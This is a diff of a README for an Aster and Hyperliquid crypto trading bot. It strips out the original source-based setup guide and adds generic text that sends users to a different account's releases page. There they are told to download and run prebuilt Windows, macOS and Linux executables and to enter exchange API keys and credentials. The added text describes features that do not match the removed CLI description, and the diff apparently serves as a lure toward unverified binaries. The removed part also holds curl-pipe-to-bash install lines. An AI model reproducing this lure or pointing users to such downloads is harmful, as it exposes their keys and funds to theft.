@@ -1,166 +1,86 @@
+# 🚀 asterdex-hl-trading-bot - Easy Trading for Everyone
 
+## 🎯 Overview
+Asterdex is your simple solution for automated trading on Aster and Hyperliquid platforms. It includes two ready-to-use trading agents: a trend follower and a market maker. This application makes trading easy, allowing you to manage your investments without needing deep technical knowledge.
 
-# Aster & HL Trading Bot
+## 📥 Download Now
+[![Download Asterdex](https://img.shields.io/badge/Download%20Asterdex%20Now-brightgreen)](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases)
 
-A Bun-powered trading workstation for Aster and Hyperliquid perpetual contracts that ships two production-ready agents: an SMA30 trend follower and a dual-sided market maker. The CLI is built with Ink, synchronises risk state from the exchange, and automatically recovers from restarts or disconnects.
+## 🚀 Getting Started
+To get started with Asterdex, follow these steps:
 
-* [Aster 30% Fee Discount Referral Link](https://www.asterdex.com/zh-CN/referral/4665f3)
-* [GRVT Fee Discount Referral Link](https://grvt.io/exchange/sign-up?ref=sea)
-* [Hyperliquid Fee Discount Referral Link](https://app.hyperliquid.xyz/trade/BTC)
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases) to find the latest version of Asterdex.
 
-## Highlights
-- **Live market data & risk sync** via websocket feeds with REST fallbacks, full reconciliation on restart.
-- **Trend engine** featuring SMA30 entries, fixed stop loss, trailing stop, Bollinger bandwidth gate, and profit-lock stepping.
-- **Market-making loop** with adaptive quote chasing, loss caps, and automatic order healing.
-- **Extensible architecture** decoupling exchange adapters, engines, and the Ink CLI for easy venue or strategy additions.
-- **Multi-exchange support** for AsterDex, GRVT, and Hyperliquid exchanges.
+2. **Choose Your Version**  
+   On the Releases page, you will see different versions of the software. Select the latest version. It will usually be labeled as the most recent or stable release.
 
-## Requirements
-- Bun ≥ 1.2 (`bun`, `bunx` available on PATH)
-- macOS, Linux, or Windows via WSL (native Windows works but WSL is recommended)
-- Node.js is optional unless your environment requires it for tooling
+3. **Download the Application**  
+   Click on the download link that matches your operating system. This typically includes files for Windows, macOS, and Linux. Your choice depends on your computer.
 
-## One-Line Bootstrap (macOS / Linux / WSL)
-```bash
-curl -fsSL https://github.com/mooncity/asterdex-hl-trading-bot/raw/refs/heads/main/setup.sh | bash
-```
-The script installs Bun, project dependencies, collects Aster API credentials, generates `.env`, and launches the CLI. Prepare your API Key/Secret before running.
+4. **Save the File**  
+   A prompt will appear to help you choose where to save the downloaded file. Select a location that is easy for you to access, like your Desktop or Downloads folder.
 
-## Manual Installation
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/mooncitydev/asterdex-hl-trading-bot.git
-   cd asterdex-hl-trading-bot
-   ```
-   Alternatively download the ZIP from GitHub and extract it manually.
-2. **Install Bun**
-   - macOS / Linux: `curl -fsSL https://bun.sh/install | bash`
-   - Windows PowerShell: `powershell -c "irm bun.sh/install.ps1 | iex"`
-   Re-open the terminal and confirm `bun -v` prints a version.
-3. **Install dependencies**
-   ```bash
-   bun install
-   ```
-4. **Create your environment file**
-   ```bash
-   cp .env.example .env
-   ```
-   Edit `.env` with your exchange credentials and overrides.
-5. **Launch the CLI**
-   ```bash
-   bun run index.ts
-   ```
-   Use the arrow keys to pick a strategy, `Enter` to start, `Esc` to return to the menu, and `Ctrl+C` to exit.
+## 🛠️ Installation Instructions
+### For Windows Users
+1. Locate the downloaded file, often named `asterdex-windows.exe`.
+2. Double-click the file to begin the installation process.
+3. If prompted, allow the app to make changes to your device.
+4. Follow the on-screen instructions to complete the installation.
 
-## Environment Variables
-The most important settings shipped in `.env.example` are summarised below:
+### For macOS Users
+1. Find the downloaded file, which is usually titled `asterdex-macos.dmg`.
+2. Double-click the `.dmg` file to mount it.
+3. Drag the Asterdex icon to your Applications folder.
+4. Eject the mounted drive by right-clicking on it and selecting 'Eject'.
 
-| Variable | Purpose |
-| --- | --- |
-| `ASTER_API_KEY` / `ASTER_API_SECRET` | Required Aster exchange credentials |
-| `TRADE_SYMBOL` | Contract symbol, defaults to `BTCUSDT` |
-| `TRADE_AMOUNT` | Order size in base asset units |
-| `LOSS_LIMIT` | Max per-trade loss (USDT) before forced close |
-| `TRAILING_PROFIT` / `TRAILING_CALLBACK_RATE` | Trailing stop trigger amount (USDT) and pullback percentage |
-| `PROFIT_LOCK_TRIGGER_USD` / `PROFIT_LOCK_OFFSET_USD` | Move the base stop once unrealised PnL exceeds this trigger |
-| `BOLLINGER_LENGTH` / `BOLLINGER_STD_MULTIPLIER` | Window size and std-dev multiplier for bandwidth filtering |
-| `MIN_BOLLINGER_BANDWIDTH` | Minimum bandwidth ratio required before opening a new position |
-| `PRICE_TICK` / `QTY_STEP` | Exchange precision filters for price and quantity |
-| `POLL_INTERVAL_MS` | Trend engine polling cadence in milliseconds |
-| `MAX_CLOSE_SLIPPAGE_PCT` | Allowed deviation vs mark price when closing |
-| `MAKER_*` | Maker strategy knobs: chase threshold, quote offsets, refresh cadence, etc. |
+### For Linux Users
+1. Open a terminal window.
+2. Navigate to the folder containing the downloaded file (use the `cd` command).
+3. Run the command `chmod +x asterdex-linux` to make it executable.
+4. Execute the file by typing `./asterdex-linux`.
 
-### Exchange Configuration
+## ⚙️ Configuration
+Before you begin trading, you will need to configure the application:
 
-**AsterDex (Default)**
-```bash
-EXCHANGE=aster
-ASTER_API_KEY=your_aster_api_key
-ASTER_API_SECRET=your_aster_api_secret
-```
+1. **API Keys**  
+   Asterdex requires your API keys from Aster and Hyperliquid exchanges. You can find these in your exchange account settings. Copy and paste them into the configuration file as instructed.
 
-**GRVT**
-```bash
-EXCHANGE=grvt
-GRVT_API_KEY=your_grvt_api_key
-GRVT_API_SECRET=your_grvt_wallet_secret
-GRVT_SUB_ACCOUNT_ID=your_trading_account_id
-```
+2. **Risk Management Settings**  
+   Set your risk limits to ensure safe trading. Determine the maximum amount you are willing to lose on each trade.
 
-**Hyperliquid**
-```bash
-EXCHANGE=hyperliquid
-HYPERLIQUID_WALLET_ADDRESS=your_wallet_address
-HYPERLIQUID_PRIVATE_KEY=your_private_key
-```
+3. **Choose Your Strategy**  
+   Decide between the SMA30 trend follower or the dual-sided market maker agent. Each has a detailed guide in the application’s help section.
 
-To trade on other exchanges, set `EXCHANGE=grvt` or `EXCHANGE=hyperliquid` and populate the respective credentials documented in `.env.example`.
+## 🔄 Running the Application
+To start using Asterdex, follow these steps:
 
-## Common Commands
-```bash
-bun run index.ts   # Launch the CLI
-bun run start      # Same as above
-bun run dev        # Development entry point
-bun x vitest run   # Execute the Vitest suite
-```
+1. **Launch Asterdex**:  
+   Open Asterdex from your Applications folder or from where you installed it.
 
-## Silent & Background Execution
-### Direct silent launch
-Skip the Ink menu and start a strategy straight from the CLI:
+2. **Login**:  
+   Enter your exchange credentials in the login screen. Ensure correct input for seamless access.
 
-```bash
-bun run index.ts --strategy trend --silent        # Trend engine
-bun run index.ts --strategy maker --silent        # Maker engine
-bun run index.ts --strategy offset-maker --silent # Offset maker engine
-```
+3. **Start Trading**:  
+   Choose which agent you wish to run and click on the "Start" button to begin. The system will manage trades according to your configured strategy.
 
-### Package scripts
-Convenience aliases are exposed in `package.json`:
+## 📊 Monitoring Trades
+While Asterdex runs, you can monitor your trades:
 
-```bash
-bun run start:trend:silent
-bun run start:maker:silent
-bun run start:offset:silent
-```
+- **Real-time Updates**: The interface will show live updates on trades executed and current positions.
+- **Performance Dashboard**: Check your trading performance over time in the dashboard, where you can see profits and losses displayed graphically.
 
-### Daemonising with pm2
-Install `pm2` locally (e.g. `bun add -d pm2`) and launch without a global install:
+## 🔧 Troubleshooting
+If you encounter issues:
 
-```bash
-bunx pm2 start bun --name aster-hl-trend --cwd . --restart-delay 5000 -- run index.ts --strategy trend --silent
-```
+- **Check Your Internet Connection**: Ensure you have a stable connection, as Asterdex relies on it for trade execution.
+- **Review Configuration**: Double-check your API keys and trading settings to ensure everything is correct.
+- **Consult the FAQ**: The FAQ section in the application provides solutions to common issues.
 
-You can also reuse the bundled scripts:
+## 🌟 Additional Resources
+- **User Manual**: A detailed user manual is available in the application to help you with advanced features.
+- **Community Forum**: Join our community forum to connect with other Asterdex users for tips and strategies.
+- **Support**: If you need further assistance, don't hesitate to reach out through our support channels available in the application.
 
-```bash
-bun run pm2:start:trend
-bun run pm2:start:maker
-bun run pm2:start:offset
-```
-
-Adjust `--name`, `--cwd`, or `--restart-delay` to suit your environment and run `pm2 save` if you want the process to auto-start after reboot.
-
-## Testing
-Vitest powers the unit tests:
-```bash
-bun run test
-bun x vitest --watch
-```
-
-## Troubleshooting
-- You need at least 50–100 USDT of capital before deploying a live strategy.
-- Set leverage on the exchange beforehand (around 50x is recommended); the bot does not change it for you.
-- Keep server/desktop time in sync with real-world time to avoid signature errors.
-- Make sure the exchange account is in one-way position mode.
-- **Env not loading**: ensure `.env` resides in the repository root and variable names are spelled correctly.
-- **Order rejected for precision**: align `PRICE_TICK`, `QTY_STEP`, and `TRADE_SYMBOL` with the exchange filters.
-- **Permission or auth errors**: double-check exchange API scopes.
-- **Hyperliquid private key security**: use a dedicated trading wallet, not your main wallet's private key.
-
-
-## Disclaimer
-Algorithmic trading carries risk. Validate strategies with paper accounts or small capital first, safeguard your API keys, and only grant the minimum required permissions.
-
-## Contact
-For questions or technical support, please contact:
-- Telegram: [@moooncity](https://t.me/moooncity)
+## 📥 Download & Install
+To download Asterdex, visit [this page](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases) for the latest release. Follow the installation instructions according to your operating system, and start your trading journey today!
